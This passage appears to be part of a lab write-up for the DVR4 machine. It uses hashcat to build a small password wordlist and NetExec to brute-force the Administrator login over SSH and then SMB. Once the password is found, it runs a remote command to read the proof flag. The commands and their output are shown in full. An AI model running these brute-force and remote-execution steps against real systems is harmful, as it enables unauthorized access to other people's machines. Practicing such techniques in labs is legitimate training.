[-] 3B76:Unknown
[+] C875:i
[+] EB60:n
[-] 7359:Unknown
[+] F641:a
[+] D9BD:c
[+] D9BD:c
[+] 8998:o
[+] AAFE:u
[+] EB60:n
[+] E03B:t
[-] 7359:Unknown
[+] E1D0:f
[+] 8998:o
[+] CA79:r
[-] 7359:Unknown
[+] F641:a
[+] 418D:d
[+] 4D7B:m
[+] C875:i
[+] EB60:n
[+] C875:i
[+] 9083:s
[+] E03B:t
[+] B740:e
[+] CA79:r
[+] C875:i
[+] EB60:n
[+] 3CD9:g
[-] 7359:Unknown
[+] D9BD:c
[+] F641:a
[+] 4D7B:m
[+] B740:e
[+] CA79:r
[+] F641:a
[+] 9083:s
```

### Create a custom wordlist

Let's create a custom wordlist with a special character appended with hashcat's mask attack (`-a 6`).

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Intermediate/DVR4]
└─$ echo '14WatchD0g' > partial_admin_pw.txt

┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Intermediate/DVR4]
└─$ hashcat -a 6 --stdout --markov-disable partial_admin_pw.txt ?s
14WatchD0g 
14WatchD0g!
14WatchD0g"
14WatchD0g#
14WatchD0g$
14WatchD0g%
14WatchD0g&
14WatchD0g'
14WatchD0g(
14WatchD0g)
14WatchD0g*
14WatchD0g+
14WatchD0g,
14WatchD0g-
14WatchD0g.
14WatchD0g/
14WatchD0g:
14WatchD0g;
14WatchD0g<
14WatchD0g=
14WatchD0g>
14WatchD0g?
14WatchD0g@
14WatchD0g[
14WatchD0g\
14WatchD0g]
14WatchD0g^
14WatchD0g_
14WatchD0g`
14WatchD0g{
14WatchD0g|
14WatchD0g}
14WatchD0g~

┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Intermediate/DVR4]
└─$ hashcat -a 6 --stdout --markov-disable partial_admin_pw.txt ?s > custom_wordlist.txt

┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Intermediate/DVR4]
└─$ wc -l custom_wordlist.txt                      
33 custom_wordlist.txt
```

### Try to brute-force Administrator's password

Now we can start to brute-force the Administrator's account over SSH with NetExec.

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Intermediate/DVR4]
└─$ nxc ssh $TARGET_IP -u administrator -p custom_wordlist.txt                  
/usr/lib/python3/dist-packages/anyio/from_thread.py:119: SyntaxWarning: 'return' in a 'finally' block
  return result
SSH         192.168.101.179 22     192.168.101.179  [*] SSH-2.0-9.68 FlowSsh: Bitvise SSH Server (WinSSHD) 9.68: free only for personal non-commercial use
SSH         192.168.101.179 22     192.168.101.179  [-] administrator:14WatchD0g
SSH         192.168.101.179 22     192.168.101.179  [-] administrator:14WatchD0g!
SSH         192.168.101.179 22     192.168.101.179  [-] administrator:14WatchD0g"
SSH         192.168.101.179 22     192.168.101.179  [-] administrator:14WatchD0g#
SSH         192.168.101.179 22     192.168.101.179  [-] administrator:14WatchD0g$
SSH         192.168.101.179 22     192.168.101.179  [-] administrator:14WatchD0g%
SSH         192.168.101.179 22     192.168.101.179  [-] administrator:14WatchD0g&
SSH         192.168.101.179 22     192.168.101.179  [-] administrator:14WatchD0g'
SSH         192.168.101.179 22     192.168.101.179  [-] administrator:14WatchD0g(
SSH         192.168.101.179 22     192.168.101.179  [-] administrator:14WatchD0g)
SSH         192.168.101.179 22     192.168.101.179  [-] administrator:14WatchD0g*
SSH         192.168.101.179 22     192.168.101.179  [-] administrator:14WatchD0g+
SSH         192.168.101.179 22     192.168.101.179  [-] administrator:14WatchD0g,
SSH         192.168.101.179 22     192.168.101.179  [-] administrator:14WatchD0g-
SSH         192.168.101.179 22     192.168.101.179  [-] administrator:14WatchD0g.
SSH         192.168.101.179 22     192.168.101.179  [-] administrator:14WatchD0g/
SSH         192.168.101.179 22     192.168.101.179  [-] administrator:14WatchD0g:
SSH         192.168.101.179 22     192.168.101.179  [-] administrator:14WatchD0g;
SSH         192.168.101.179 22     192.168.101.179  [-] administrator:14WatchD0g<
SSH         192.168.101.179 22     192.168.101.179  [-] administrator:14WatchD0g=
[15:18:00] ERROR    Internal Paramiko error for administrator:14WatchD0g>, Error reading SSH protocol banner                                                                   ssh.py:134
           ERROR    Internal Paramiko error for administrator:14WatchD0g?, Error reading SSH protocol banner                                                                   ssh.py:134
           ERROR    Internal Paramiko error for administrator:14WatchD0g@, Error reading SSH protocol banner                                                                   ssh.py:134
           ERROR    Internal Paramiko error for administrator:14WatchD0g[, Error reading SSH protocol banner                                                                   ssh.py:134
           ERROR    Internal Paramiko error for administrator:14WatchD0g\, Error reading SSH protocol banner                                                                   ssh.py:134
[15:18:01] ERROR    Internal Paramiko error for administrator:14WatchD0g], Error reading SSH protocol banner                                                                   ssh.py:134
           ERROR    Internal Paramiko error for administrator:14WatchD0g^, Error reading SSH protocol banner                                                                   ssh.py:134
           ERROR    Internal Paramiko error for administrator:14WatchD0g_, Error reading SSH protocol banner                                                                   ssh.py:134
           ERROR    Internal Paramiko error for administrator:14WatchD0g`, Error reading SSH protocol banner                                                                   ssh.py:134
           ERROR    Internal Paramiko error for administrator:14WatchD0g{, Error reading SSH protocol banner[Errno 104] Connection reset by peer                               ssh.py:134
           ERROR    Internal Paramiko error for administrator:14WatchD0g|, Error reading SSH protocol banner                                                                   ssh.py:134
           ERROR    Internal Paramiko error for administrator:14WatchD0g}, Error reading SSH protocol banner                                                                   ssh.py:134
           ERROR    Internal Paramiko error for administrator:14WatchD0g~, Error reading SSH protocol banner                                                                   ssh.py:134
```

Ouch! It looks like the SSH-service crashed or something.

Let's switch to SMB instead.

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Intermediate/DVR4]
└─$ nxc smb $TARGET_IP -u administrator -p custom_wordlist.txt  
/usr/lib/python3/dist-packages/anyio/from_thread.py:119: SyntaxWarning: 'return' in a 'finally' block
  return result
SMB         192.168.101.179 445    DVR4             [*] Windows 10 / Server 2019 Build 19041 x64 (name:DVR4) (domain:DVR4) (signing:False) (SMBv1:None)
SMB         192.168.101.179 445    DVR4             [-] DVR4\administrator:14WatchD0g STATUS_LOGON_FAILURE 
SMB         192.168.101.179 445    DVR4             [-] DVR4\administrator:14WatchD0g! STATUS_LOGON_FAILURE 
SMB         192.168.101.179 445    DVR4             [-] DVR4\administrator:14WatchD0g" STATUS_LOGON_FAILURE 
SMB         192.168.101.179 445    DVR4             [-] DVR4\administrator:14WatchD0g# STATUS_LOGON_FAILURE 
SMB         192.168.101.179 445    DVR4             [+] DVR4\administrator:14WatchD0g$ (Pwn3d!)
```

Success. Now we know the password (`14WatchD0g$`).

### Get the root flag

Excellent, we ought to be able to get the root flag via SMB directly.

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Intermediate/DVR4]
└─$ nxc smb $TARGET_IP -u administrator -p '14WatchD0g$' -x "type C:\Users\Administrator\Desktop\proof.txt"
/usr/lib/python3/dist-packages/anyio/from_thread.py:119: SyntaxWarning: 'return' in a 'finally' block
  return result
SMB         192.168.101.179 445    DVR4             [*] Windows 10 / Server 2019 Build 19041 x64 (name:DVR4) (domain:DVR4) (signing:False) (SMBv1:None)
SMB         192.168.101.179 445    DVR4             [+] DVR4\administrator:14WatchD0g$ (Pwn3d!)
SMB         192.168.101.179 445    DVR4             [+] Executed command via wmiexec
SMB         192.168.101.179 445    DVR4             e<REDACTED>5
```

And there we have the flag!

For additional information, please see the references below.

## References

- [curl - Homepage](https://curl.se/)
- [curl - Linux manual page](https://man7.org/linux/man-pages/man1/curl.1.html)
- [cURL - Wikipedia](https://en.wikipedia.org/wiki/CURL)
- [Directory traversal attack - Wikipedia](https://en.wikipedia.org/wiki/Directory_traversal_attack)
- [export - Linux manual page](https://www.man7.org/linux/man-pages/man1/export.1p.html)
- [grep - Linux manual page](https://man7.org/linux/man-pages/man1/grep.1.html)
- [Hashcat - Homepage](https://hashcat.net/hashcat/)
- [Hashcat - Kali Tools](https://www.kali.org/tools/hashcat/)
- [Hashcat - Wiki](https://hashcat.net/wiki/)
- [Microsoft RPC - Wikipedia](https://en.wikipedia.org/wiki/Microsoft_RPC)
- [NetBIOS over TCP/IP - Wikipedia](https://en.wikipedia.org/wiki/NetBIOS_over_TCP/IP)
- [NetExec - GitHub](https://github.com/Pennyw0rth/NetExec)
- [NetExec - Kali Tools](https://www.kali.org/tools/netexec/)
- [NetExec - Wiki](https://www.netexec.wiki)
- [nmap - Homepage](https://nmap.org/)
- [nmap - Linux manual page](https://linux.die.net/man/1/nmap)
- [nmap - Manual page](https://nmap.org/book/man.html)
- [Path traversal - PortSwigger](https://portswigger.net/web-security/file-path-traversal)
- [Python (programming language) - Wikipedia](https://en.wikipedia.org/wiki/Python_(programming_language))
- [searchsploit - Homepage](https://www.exploit-db.com/searchsploit)
- [searchsploit - Kali Tools](https://www.kali.org/tools/exploitdb/#searchsploit)
- [Server Message Block - Wikipedia](https://en.wikipedia.org/wiki/Server_Message_Block)
- [sudo - Linux manual page](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [sudo - Wikipedia](https://en.wikipedia.org/wiki/Sudo)
- [type - Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/type)
- [vi - Linux manual page](https://man7.org/linux/man-pages/man1/vi.1p.html)
- [wc - Linux manual page](https://man7.org/linux/man-pages/man1/wc.1.html)
- [whoami - Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/whoami)
